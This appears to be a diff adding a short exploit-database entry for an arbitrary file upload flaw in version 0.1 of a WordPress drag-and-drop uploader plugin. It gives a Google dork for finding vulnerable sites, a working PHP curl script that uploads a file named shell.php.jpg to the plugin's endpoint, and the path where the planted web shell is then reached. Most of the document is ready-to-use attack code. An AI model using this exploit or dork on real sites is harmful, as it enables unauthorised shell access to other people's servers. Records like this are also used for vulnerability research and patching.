@@ -1,0 +1,31 @@
+###########################################################
+#
+# Exploit Title: Wordpress drag and drop file upload 0.1 Arbitrary File Upload
+# Google Dork: inurl:wp-content/plugins/drag-drop-file-uploader/
+# Date: 11/06/2012
+# Exploit Author: Adrien Thierry
+# Vendor Homepage:  http://www.ali.dj/
+# Software Link: http://downloads.wordpress.org/plugin/drag-drop-file-uploader.0.1.zip
+# Version: 0.1
+#
+###########################################################
+
+Vuln page : http://mysite.com/wp-content/plugins/drag-drop-file-uploader/dnd-upload.php
+
+exploit :
+
+<?php
+$u="shell.php.jpg";
+$c = curl_init("http://127.0.0.1/wp/wp-content/plugins/drag-drop-file-uploader/dnd-upload.php");
+curl_setopt($c, CURLOPT_POST, true);
+curl_setopt($c, CURLOPT_POSTFIELDS,
+array('file'=>"@$u"));
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$e = curl_exec($c);
+curl_close($c);
+echo $e; 
+?>
+
+Shell access : http://mysite.com/wp-content/uploads/[YYYY]/[MM]/shell.php.jpg
+
+#####################################################################
